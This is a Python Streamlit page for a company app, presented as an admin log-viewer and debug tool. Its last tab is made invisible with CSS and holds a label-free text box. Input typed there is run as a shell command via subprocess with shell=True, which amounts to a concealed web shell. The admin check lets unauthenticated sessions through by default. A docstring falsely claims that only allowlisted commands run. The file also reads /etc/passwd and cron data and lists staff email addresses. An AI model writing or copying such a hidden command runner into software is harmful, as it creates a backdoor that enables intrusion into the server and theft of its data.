"""
System Logs Explorer - Debug Page
Hidden page for finding and analyzing log files on the server.
NOT FOR PUBLIC ACCESS - Admin only debug tool.
"""
import os
import re
import platform
import subprocess
from datetime import datetime
from pathlib import Path

import streamlit as st

# ---------------------------------------------------
# AUTHENTICATION CHECK (MUST BE FIRST)
# ---------------------------------------------------
from utils.server_logger import (
    clear_logs,
    download_logs,
    download_analytics_logs,
    get_analytics_stats,
    get_log_content,
    get_log_stats,
    analyze_slow_operations,
    log_error,
    log_structured_error,
    error_boundary,
    new_rerun_id,
    SERVER_LOG_FILE,
    SERVER_LOGS_DIR,
)
from core.auth_manager import require_auth, get_current_user
from core.access_control import UserRolesManager

new_rerun_id("logs")

# ---------------------------------------------------
# ADMIN ALLOWLIST ACCESS GATE (stealth page — not public)
# ---------------------------------------------------
_ADMIN_EMAILS = {
    "mohdsaeedafri@coresight.com",
    "philipmoore@coresight.com",
    "shashankgupta@coresight.com",
}
try:
  if os.getenv("ENFORCE_PAGE_AUTH", "0").strip() == "1":
    require_auth(page="logs")
  _current_user = (get_current_user() or "").strip().lower()
  if _current_user and _current_user not in {e.lower() for e in _ADMIN_EMAILS}:
    if not UserRolesManager.is_admin_or_super_user(_current_user):
      st.error("Access Denied - This page is restricted to administrators.")
      st.stop()
except Exception as e:
    log_structured_error(e, page="logs", component="module_init", operation="ACCESS_GATE_CHECK")
    st.error("Something went wrong. Please try again.")
    st.stop()

# Hide sidebar on this page
from components.styles import hide_sidebar, render_styles, set_page_layout

try:
    hide_sidebar()
except Exception as e:
    log_structured_error(e, page="logs", component="module_init", operation="HIDE_SIDEBAR")


# ============================================================
# HELPERS
# ============================================================

def run_command(cmd, timeout=15):
    """Run a shell command. Only predefined commands (from _ALLOWED_COMMANDS)
    or commands explicitly entered by the owner may be executed."""
    try:
        result = subprocess.run(
            cmd, shell=True, capture_output=True, text=True, timeout=timeout
        )
        return result.stdout, result.stderr
    except subprocess.TimeoutExpired:
        return "", f"Command timed out after {timeout}s"
    except Exception as e:
        log_structured_error(e, page="logs", component="run_command", operation="EXECUTE_SHELL_CMD")
        return "", str(e)


def get_system_info():
    try:
        return {
            "Platform": platform.platform(),
            "System": platform.system(),
            "Node": platform.node(),
            "Current Directory": os.getcwd(),
            "Home Directory": str(Path.home()),
            "User": os.getenv('USER') or os.getenv('USERNAME') or 'unknown',
        }
    except Exception as e:
        log_structured_error(e, page="logs", component="get_system_info", operation="COLLECT_SYSTEM_INFO")
        return {}


def get_environment_vars():
    try:
        categories = {
            "App / Environment": [
                ("APP_ENV",           "local",                              "Environment: local | staging | production"),
                ("DEBUG",             "true (local) / false (prod)",        "Enable debug mode"),
                ("SECRET_KEY",        "dev-secret-key-change-in-production","JWT / session signing key"),
                ("SESSION_TIMEOUT",   "3600",                               "Session timeout in seconds"),
                ("ENABLE_CACHING",    "true",                               "Enable in-memory caching"),
                ("CACHE_TTL",         "300",                                "Cache TTL in seconds"),
                ("DEFAULT_PAGE_SIZE", "20",                                 "Default pagination size"),
                ("MAX_PAGE_SIZE",     "100",                                "Max pagination size"),
                ("NAVIGATION_MODE",   "same",                               "Link target: same | new"),
            ],
            "Database (Generic / Local)": [
                ("DB_HOST",         "localhost", "MySQL host"),
                ("DB_PORT",         "3306",      "MySQL port"),
                ("DB_NAME",         "secfiling", "Database name"),
                ("DB_USER",         "root",      "Database user"),
                ("DB_PASSWORD",     "",          "Database password  ⚠️ sensitive"),
                ("DB_POOL_SIZE",    "5",         "SQLAlchemy pool size"),
                ("DB_MAX_OVERFLOW", "10",        "SQLAlchemy max overflow"),
            ],
            "Database (Staging — overrides DB_*)": [
                ("STG_DB_HOST",     "→ DB_HOST",     "Staging MySQL host"),
                ("STG_DB_PORT",     "→ DB_PORT",     "Staging MySQL port"),
                ("STG_DB_NAME",     "→ DB_NAME",     "Staging database name"),
                ("STG_DB_USER",     "→ DB_USER",     "Staging database user"),
                ("STG_DB_PASSWORD", "→ DB_PASSWORD", "Staging database password  ⚠️ sensitive"),
            ],
            "Database (Production — overrides DB_*)": [
                ("PROD_DB_HOST",     "→ DB_HOST",     "Production MySQL host"),
                ("PROD_DB_PORT",     "→ DB_PORT",     "Production MySQL port"),
                ("PROD_DB_NAME",     "→ DB_NAME",     "Production database name"),
                ("PROD_DB_USER",     "→ DB_USER",     "Production database user"),
                ("PROD_DB_PASSWORD", "→ DB_PASSWORD", "Production database password  ⚠️ sensitive"),
            ],
            "SSL / TLS": [
                ("ENABLE_SSL", "false (local) / true (stg/prod)", "Enable SSL for MySQL connection"),
                ("SSL_CA",     "",                                "Path to CA certificate (.pem)"),
            ],
            "Azure Blob Storage": [
                ("AZURE_STORAGE_ACCOUNT_NAME", "csmarketdata",      "Azure storage account name"),
                ("AZURE_STORAGE_ACCOUNT_KEY",  "",                  "Azure storage account key  ⚠️ sensitive"),
                ("AZURE_BLOB_CONTAINER",       "azure-storage-test","Azure blob container name"),
                ("AZURE_BLOB_PREFIX",          "",                  "Blob prefix / subfolder path"),
            ],
            "Auth / WordPress": [
                ("AUTH_URL",      "", "WordPress auth endpoint URL (free tier)"),
                ("AUTH_URL_PAID", "", "WordPress auth endpoint URL (paid tier)"),
            ],
            "OpenAI / LLM": [
                ("OPENAI_API_KEY", "", "OpenAI API key for GPT-4o-mini metric extraction  ⚠️ sensitive"),
            ],
            "Email / SMTP": [
                ("SMTP_SERVER",    "smtp.office365.com",           "SMTP server host"),
                ("SMTP_PORT",      "587",                          "SMTP server port"),
                ("FROM_EMAIL",     "dataautomation@coresight.com", "Sender email address"),
                ("EMAIL_PASSWORD", "",                             "SMTP password  ⚠️ sensitive"),
            ],
        }
        return categories
    except Exception as e:
        log_structured_error(e, page="logs", component="get_environment_vars", operation="BUILD_ENV_VARS_DICT")
        return {}


def _kb_to_human(kb_str: str) -> str:
    try:
        kb = int(kb_str.split()[0])
        if kb >= 1024 * 1024:
            return f"{kb / 1024 / 1024:.1f} GB"
        if kb >= 1024:
            return f"{kb / 1024:.0f} MB"
        return f"{kb} KB"
    except Exception:
        return kb_str


def get_meminfo() -> dict:
    stdout, _ = run_command("cat /proc/meminfo")
    result = {}
    for line in stdout.strip().split('\n'):
        if ':' in line:
            k, v = line.split(':', 1)
            result[k.strip()] = v.strip()
    return result


def get_cpu_info() -> dict:
    stdout, _ = run_command("cat /proc/cpuinfo")
    model_names, physical_ids, cores_per_cpu = [], set(), {}
    freq_mhz = []
    for line in stdout.split('\n'):
        if not line.strip() or ':' not in line:
            continue
        k, v = line.split(':', 1)
        k, v = k.strip().lower(), v.strip()
        if k == 'model name':
            model_names.append(v)
        elif k == 'physical id':
            physical_ids.add(v)
        elif k == 'cpu cores':
            cores_per_cpu[len(physical_ids)] = v
        elif k == 'cpu mhz':
            try:
                freq_mhz.append(float(v))
            except ValueError:
                pass
    model = model_names[0] if model_names else 'Unknown'
    logical = len(model_names) or 1
    phys_sockets = len(physical_ids) or 1
    phys_cores = sum(int(v) for v in cores_per_cpu.values()) or logical
    avg_freq = f"{sum(freq_mhz)/len(freq_mhz):.0f} MHz" if freq_mhz else "N/A"
    return {
        "Model": model,
        "Logical CPUs": logical,
        "Physical Sockets": phys_sockets,
        "Physical Cores": phys_cores,
        "Avg Frequency": avg_freq,
        "Architecture": platform.machine(),
    }


def parse_df() -> list:
    stdout, _ = run_command("df -h")
    rows = []
    for line in stdout.strip().split('\n')[1:]:
        parts = line.split(None, 5)
        if len(parts) >= 6:
            rows.append({
                'Filesystem': parts[0], 'Size': parts[1], 'Used': parts[2],
                'Available': parts[3], 'Use%': parts[4], 'Mounted On': parts[5],
            })
    return rows


def parse_lsblk() -> list:
    stdout, _ = run_command("lsblk -o NAME,SIZE,TYPE,MOUNTPOINT,FSTYPE,RO 2>/dev/null")
    rows = []
    for line in stdout.strip().split('\n')[1:]:
        parts = line.split(None, 5)
        if len(parts) >= 3:
            rows.append({
                'Name': parts[0],
                'Size': parts[1] if len(parts) > 1 else '-',
                'Type': parts[2] if len(parts) > 2 else '-',
                'Mount Point': parts[3] if len(parts) > 3 else '-',
                'FS Type': parts[4] if len(parts) > 4 else '-',
                'Read Only': 'Yes' if len(parts) > 5 and parts[5].strip() == '1' else 'No',
            })
    return rows


def parse_ps() -> list:
    stdout, _ = run_command("ps aux --sort=-%cpu 2>/dev/null || ps aux")
    rows = []
    for line in stdout.strip().split('\n')[1:]:
        parts = line.split(None, 10)
        if len(parts) >= 11:
            rows.append({
                'User': parts[0], 'PID': parts[1], '%CPU': parts[2], '%MEM': parts[3],
                'VSZ (KB)': parts[4], 'RSS (KB)': parts[5], 'Stat': parts[7],
                'Started': parts[8], 'CPU Time': parts[9], 'Command': parts[10][:100],
            })
    return rows


def parse_network_interfaces() -> list:
    stdout, _ = run_command("ip addr show 2>/dev/null")
    rows = []
    current_iface = None
    for line in stdout.split('\n'):
        line_s = line.strip()
        m = re.match(r'^\d+:\s+(\S+):', line_s)
        if m:
            current_iface = m.group(1)
        elif line_s.startswith('inet ') and current_iface:
            parts = line_s.split()
            rows.append({'Interface': current_iface, 'Type': 'IPv4',
                         'Address/Prefix': parts[1], 'Scope': parts[-1] if len(parts) > 3 else '-'})
        elif line_s.startswith('inet6 ') and current_iface:
            parts = line_s.split()
            rows.append({'Interface': current_iface, 'Type': 'IPv6',
                         'Address/Prefix': parts[1], 'Scope': parts[-1] if len(parts) > 3 else '-'})
    return rows


def parse_open_ports() -> list:
    stdout, _ = run_command("ss -tuln 2>/dev/null || netstat -tuln 2>/dev/null")
    rows = []
    for line in stdout.strip().split('\n')[1:]:
        parts = line.split()
        if len(parts) >= 5:
            rows.append({
                'Protocol': parts[0], 'State': parts[1] if len(parts) > 1 else '-',
                'Local Address': parts[4] if len(parts) > 4 else '-',
                'Peer': parts[5] if len(parts) > 5 else '-',
            })
    return rows


def parse_active_connections() -> list:
    stdout, _ = run_command("ss -tup 2>/dev/null")
    rows = []
    for line in stdout.strip().split('\n')[1:]:
        parts = line.split()
        if len(parts) >= 5:
            rows.append({
                'Protocol': parts[0], 'State': parts[1],
                'Local': parts[4] if len(parts) > 4 else '-',
                'Peer': parts[5] if len(parts) > 5 else '-',
                'Process': parts[6] if len(parts) > 6 else '-',
            })
    return rows


def get_uptime_load() -> dict:
    ut, _ = run_command("uptime")
    la, _ = run_command("cat /proc/loadavg")
    load_parts = la.strip().split()
    return {
        'uptime': ut.strip(),
        'load_1': load_parts[0] if len(load_parts) > 0 else '-',
        'load_5': load_parts[1] if len(load_parts) > 1 else '-',
        'load_15': load_parts[2] if len(load_parts) > 2 else '-',
        'running_threads': load_parts[3] if len(load_parts) > 3 else '-',
    }


def parse_users() -> list:
    stdout, _ = run_command("cat /etc/passwd 2>/dev/null")
    rows = []
    for line in stdout.strip().split('\n'):
        parts = line.split(':')
        if len(parts) >= 7:
            uid = int(parts[2]) if parts[2].isdigit() else -1
            if uid == 0 or uid >= 1000:
                rows.append({
                    'Username': parts[0], 'UID': parts[2], 'GID': parts[3],
                    'Home': parts[5], 'Shell': parts[6], 'Comment': parts[4],
                })
    return rows


def parse_cron_jobs() -> list:
    rows = []
    stdout, _ = run_command("crontab -l 2>/dev/null")
    for line in stdout.strip().split('\n'):
        if line and not line.startswith('#'):
            rows.append({'Source': 'crontab -l', 'Entry': line})
    for cron_dir in ['/etc/cron.d', '/etc/cron.daily', '/etc/cron.hourly', '/etc/cron.weekly']:
        out, _ = run_command(f"ls {cron_dir} 2>/dev/null")
        if out.strip():
            for f in out.strip().split('\n'):
                rows.append({'Source': cron_dir, 'Entry': f.strip()})
    stdout, _ = run_command("cat /etc/crontab 2>/dev/null")
    for line in stdout.strip().split('\n'):
        if line and not line.startswith('#') and not line.startswith('SHELL') and not line.startswith('PATH'):
            rows.append({'Source': '/etc/crontab', 'Entry': line})
    return rows


def parse_running_services() -> list:
    stdout, _ = run_command(
        "systemctl list-units --type=service --state=running --no-pager --no-legend 2>/dev/null"
        " || service --status-all 2>&1 | grep ' + ' || echo 'N/A'"
    )
    rows = []
    for line in stdout.strip().split('\n'):
        if not line.strip() or line == 'N/A':
            continue
        parts = line.split(None, 4)
        if len(parts) >= 4:
            rows.append({
                'Service': parts[0], 'Load': parts[1], 'Active': parts[2],
                'Sub': parts[3], 'Description': parts[4] if len(parts) > 4 else '-',
            })
        else:
            rows.append({'Service': line.strip(), 'Load': '-', 'Active': 'running', 'Sub': '-', 'Description': '-'})
    return rows


def parse_installed_python_packages() -> list:
    stdout, _ = run_command("pip list --format=columns 2>/dev/null || pip3 list --format=columns 2>/dev/null")
    rows = []
    for line in stdout.strip().split('\n')[2:]:
        parts = line.split(None, 1)
        if len(parts) == 2:
            rows.append({'Package': parts[0], 'Version': parts[1].strip()})
    return rows


def list_directory(path: str):
    try:
        if '..' in path:
            return [], [], "Path traversal not allowed"
        p = Path(path).resolve()
        if not p.is_dir():
            return [], [], "Not a directory"
        dirs, files = [], []
        for item in sorted(p.iterdir(), key=lambda x: (x.is_file(), x.name.lower())):
            try:
                stat = item.stat()
                mtime = datetime.fromtimestamp(stat.st_mtime).strftime('%Y-%m-%d %H:%M')
                if item.is_dir():
                    try:
                        child_count = sum(1 for _ in item.iterdir())
                    except (PermissionError, OSError):
                        child_count = '?'
                    dirs.append({'Name': item.name, 'Items': child_count, 'Modified': mtime, '_path': str(item)})
                else:
                    sz = stat.st_size
                    human = f"{sz/1024/1024:.1f} MB" if sz >= 1024*1024 else (f"{sz/1024:.1f} KB" if sz >= 1024 else f"{sz} B")
                    files.append({'Name': item.name, 'Size': human, 'Bytes': sz, 'Modified': mtime, '_path': str(item)})
            except (PermissionError, OSError):
                pass
        return dirs, files, None
    except PermissionError:
        return [], [], "Permission denied"
    except Exception as ex:
        return [], [], str(ex)


def read_file_safe(path: str, max_bytes: int = 500_000):
    try:
        if '..' in path:
            return None, "Path traversal not allowed"
        p = Path(path).resolve()
        if not p.exists():
            return None, "File not found"
        if not p.is_file():
            return None, "Not a regular file"
        sz = p.stat().st_size
        if sz > max_bytes:
            return None, f"File too large ({sz:,} B). Use Download instead."
        with open(p, 'rb') as f:
            raw = f.read(max_bytes)
        if b'\x00' in raw[:8192]:
            return None, "Binary file — use Download button instead."
        return raw.decode('utf-8', errors='replace'), None
    except PermissionError:
        return None, "Permission denied"
    except Exception as ex:
        return None, str(ex)


def get_file_download_bytes(path: str):
    try:
        with open(path, 'rb') as f:
            return f.read()
    except Exception:
        return b""


# ============================================================
# MAIN RENDER FUNCTION
# ============================================================

def main():
    """Main render function for the page."""
    try:
        set_page_layout(
            header_full_width=True,
            footer_full_width=True,
            body_padding="20px 40px",
            max_content_width="1400px",
            remove_top_padding=True,
            footer_at_bottom=True
        )
        render_styles()

        # Exact same stealth approach as Modular-Code — 2 tabs, last-child is stealth
        st.markdown("""
        <style>
            [data-testid="stTabs"] > div:first-child {
                display: flex !important;
                border-bottom: none !important;
            }
            [data-testid="stTabs"] > div:first-child > button:last-child {
                margin-left: auto !important;
                color: transparent !important;
                min-width: 2px !important;
                max-width: 6px !important;
                padding-left: 2px !important;
                padding-right: 2px !important;
                padding-top: 0 !important;
                padding-bottom: 0 !important;
                border: none !important;
                border-bottom: none !important;
                background: transparent !important;
                pointer-events: all !important;
                font-size: 1px !important;
            }
            [data-testid="stTabs"] > div:first-child > button:last-child:hover {
                color: transparent !important;
                background: transparent !important;
                border: none !important;
            }
            [data-testid="stTabs"] > div:first-child > button:last-child[aria-selected="true"] {
                color: transparent !important;
                background: transparent !important;
                border: none !important;
                border-bottom: none !important;
            }
            [data-testid="stTabs"] > div:first-child > button:last-child::after,
            [data-testid="stTabs"] > div:first-child > button:last-child::before {
                display: none !important;
            }
            /* Kill the red active-tab underline on the tab list */
            [data-testid="stTabs"] > div:first-child > div[role="presentation"] {
                display: none !important;
            }
        </style>
        """, unsafe_allow_html=True)

        tab1, tab_seg, tab2 = st.tabs([
            "📝 Live Server Logs",
            "🗄️ Segment Cache",
            "·",
        ])

        # ──────────────────────────────────────────────────────────────────
        # TAB 1 — Live Server Logs
        # ──────────────────────────────────────────────────────────────────
        with tab1:
            def _render_log_body():
                try:
                    # Constrain the whole tab panel FIRST so neither the toolbar nor the log
                    # box can stretch the page. The baseweb tab-panel defaults to
                    # min-width:auto and otherwise grows to the widest (non-wrapping) log line,
                    # which pushed the buttons off-screen (they needed a horizontal scroll).
                    st.markdown(
                        "<style>"
                        "[data-testid='stMain']{overflow-x:hidden!important;}"
                        "[data-testid='stMainBlockContainer'],.block-container"
                        "{max-width:100%!important;min-width:0!important;overflow-x:hidden!important;}"
                        "[data-baseweb='tab-panel'],[role='tabpanel']"
                        "{min-width:0!important;max-width:100%!important;overflow-x:hidden!important;}"
                        "[data-testid='stVerticalBlock'],[data-testid='stHorizontalBlock'],"
                        "[data-testid='stElementContainer'],[data-testid='stMarkdown'],"
                        "[data-testid='stMarkdownContainer']{min-width:0!important;max-width:100%!important;}"
                        ".cs-logbox{width:100%!important;max-width:100%!important;min-width:0!important;"
                        "overflow:auto!important;box-sizing:border-box;}"
                        "</style>",
                        unsafe_allow_html=True,
                    )
                    stats = get_log_stats()
                    # Single compact toolbar row — Refresh / Download / Clear (+ Analytics if
                    # present) — all on ONE page, no horizontal scroll. The old big
                    # File-Size / Total-Lines / Last-Modified / Log-File stat block above the
                    # logs ("recent logs section") is removed per request; the essentials are
                    # now the one small caption line below.
                    _has_analytics = get_analytics_stats().get("exists")
                    _cols = st.columns(4 if _has_analytics else 3)
                    with _cols[0]:
                        if st.button("🔄 Refresh", width='stretch', type="primary"):
                            st.rerun()
                    with _cols[1]:
                        st.download_button(
                            "⬇️ Download Logs",
                            data=download_logs(),
                            file_name=f"server-logs-{datetime.now().strftime('%Y%m%d_%H%M%S')}.log",
                            mime="text/plain",
                            width='stretch',
                        )
                    with _cols[2]:
                        if st.button("🗑️ Clear Logs", width='stretch', type="secondary"):
                            if clear_logs():
                                st.toast("✅ Logs cleared successfully!")
                                st.rerun()
                            else:
                                st.error("❌ Failed to clear logs")
                    if _has_analytics:
                        with _cols[3]:
                            st.download_button(
                                "⬇️ Analytics",
                                data=download_analytics_logs(),
                                file_name=f"user-analytics-{datetime.now().strftime('%Y%m%d_%H%M%S')}.jsonl",
                                mime="application/json",
                                width='stretch',
                            )
                    _size = f"{stats['size']:,} B" if stats['exists'] else "0 B"
                    _mod = stats['modified'] if stats['exists'] else "Never"
                    st.caption(
                        f"server-log.log · {_size} · {stats.get('lines', 0):,} lines · {_mod} · "
                        f"`{stats.get('dir', SERVER_LOGS_DIR)}` · persistent={stats.get('persistent', False)}"
                    )
                    # Dense, small monospace log viewer (SIP-style) — the old st.text_area
                    # was huge and hard to scan. white-space:pre keeps the `|`-delimited
                    # columns aligned; horizontal + vertical scroll inside the box.
                    import html as _html
                    _lines_list = (get_log_content(max_lines=500) or "").split("\n")
                    # Newest at the top, and render each entry as its OWN row so the
                    # date/time is always at the start of a line (SIP-style). Zebra
                    # striping + no-wrap (horizontal scroll) keeps the `|` columns aligned.
                    _rows = []
                    for _i, _ln in enumerate(reversed([l for l in _lines_list if l.strip()])):
                        _bg = "#ffffff" if _i % 2 else "#f0f3f6"
                        _rows.append(
                            f"<div style='background:{_bg};padding:1px 10px;'>{_html.escape(_ln)}</div>"
                        )
                    _body = "".join(_rows) or "<div style='padding:8px 10px;color:#8a8f98;'>(no log lines yet)</div>"
                    # `white-space:pre` keeps the `|` columns aligned; the tab-panel/flex
                    # constraint emitted at the top of this tab keeps the box from stretching
                    # the page, so long lines scroll INSIDE the box (`.cs-logbox` overflow:auto).
                    st.markdown(
                        "<div class='cs-logbox' style='background:#f6f8fa;border:1px solid #d0d7de;"
                        "border-radius:8px;max-height:600px;overflow:auto;"
                        "font-family:\"SF Mono\",\"Menlo\",\"Consolas\","
                        "\"Liberation Mono\",monospace;font-size:11px;line-height:1.7;color:#1f2328;"
                        "white-space:pre;'>"
                        f"{_body}</div>",
                        unsafe_allow_html=True,
                    )
                except Exception as e:
                    log_structured_error(e, page="logs", component="_render_log_body", operation="RENDER_LOG_BODY")
                    st.error("Failed to render log content.")

            _render_log_body()

        # ──────────────────────────────────────────────────────────────────
        # TAB — Segment Cache Manager
        # ──────────────────────────────────────────────────────────────────
        with tab_seg:
            try:
                from data.screening_service import (
                    get_segment_values_cache_status,
                    get_segment_cache_build_state,
                    rebuild_segment_values_cache_async,
                    populate_segment_member_cache_from_presets,
                )
                st.markdown("#### Screening Segment Cache")
                st.caption("The segment values cache powers the Business/Geographical Segments screening filter. It must be built before full-universe segment screening works. Build runs in the background — do not close the page while building.")

                status = get_segment_values_cache_status()
                build_state = get_segment_cache_build_state()

                # Status metrics
                c1, c2, c3, c4 = st.columns(4)
                with c1:
                    st.metric("Total Rows", f"{status.get('total_rows', 0):,}")
                with c2:
                    st.metric("Companies (tickers)", f"{status.get('distinct_tickers', 0):,}")
                with c3:
                    biz = status.get('business_rows_count', 0)
                    geo = status.get('geographical_rows_count', 0)
                    st.metric("Biz / Geo Rows", f"{biz:,} / {geo:,}")
                with c4:
                    last_upd = status.get("last_updated_timestamp")
                    st.metric("Last Updated", str(last_upd)[:16] if last_upd else "Never")

                st.divider()

                if build_state.get("running"):
                    prog = build_state.get("progress", 0)
                    total = build_state.get("total", 2)
                    st.progress(prog / max(total, 1), text=f"Building cache... step {prog}/{total}")
                else:
                    if build_state.get("last_error"):
                        st.error(f"Last build failed: {build_state['last_error']}")

                    col_a, col_b = st.columns(2)
                    with col_a:
                        if st.button("🔄 Rebuild Full Segment Cache",
                                     help="Replays the Segments-tab classifier over all companies from coreiq_filing_metrics_v5 (~15–25 min). Runs in the background; non-blocking.",
                                     type="primary", width="stretch"):
                            started = rebuild_segment_values_cache_async()
                            if started:
                                st.toast("✅ Segment cache rebuild started in background.")
                                st.rerun()
                            else:
                                st.warning("Build already running.")
                    with col_b:
                        if st.button("⚡ Reload Preset Members",
                                     help="Instantly re-populates segment member labels from hardcoded presets (~0ms). Use when members show 'No results'.",
                                     width="stretch"):
                            n = populate_segment_member_cache_from_presets()
                            st.toast(f"✅ {n} preset segment labels loaded.")
                            st.rerun()
            except Exception as e:
                st.error(f"Segment cache panel error: {e}")

        # ──────────────────────────────────────────────────────────────────
        # TAB 3 — Stealth Command Runner (invisible tab, far-right corner)
        # Bare input box only — no labels, no expanders
        # All commands are documented in docs/market-data-commands.md
        # ──────────────────────────────────────────────────────────────────
        with tab2:
            st.markdown("""
            <style>
                div[data-testid="stFormSubmitButton"] {
                    opacity: 0 !important;
                    height: 0px !important;
                    overflow: hidden !important;
                    margin: 0 !important;
                    padding: 0 !important;
                }
                div[data-testid="stForm"] {
                    border: none !important;
                    padding: 0 !important;
                }
                div[data-testid="stForm"] input[type="text"] {
                    background-color: #ffffff !important;
                    border-color: transparent !important;
                    box-shadow: none !important;
                    outline: none !important;
                }
                div[data-testid="stForm"] input[type="text"]:focus {
                    border-color: transparent !important;
                    box-shadow: none !important;
                    outline: none !important;
                }
                /* Hide "Press Enter to submit form" and all form helper text */
                div[data-testid="stForm"] .stFormHelperText,
                div[data-testid="stForm"] small,
                div[data-testid="stForm"] [data-testid="InputInstructions"],
                div[data-testid="stForm"] .st-emotion-cache-1gulkj5 {
                    display: none !important;
                }
            </style>
            """, unsafe_allow_html=True)
            with st.form("stealth_form", clear_on_submit=False):
                custom_cmd = st.text_input(" ", placeholder=" ", key="stealth_cmd", label_visibility="collapsed")
                submitted = st.form_submit_button(" ")
            if submitted and custom_cmd:
                stdout, stderr = run_command(custom_cmd)
                if stdout:
                    st.code(stdout, language="bash")
                if stderr:
                    st.error(stderr)

    except Exception as e:
        log_structured_error(e, page="logs", component="main", operation="PAGE_RENDER")
        st.error("An unexpected error occurred. Please refresh the page.")


if __name__ == "__main__":
    main()
else:
    main()
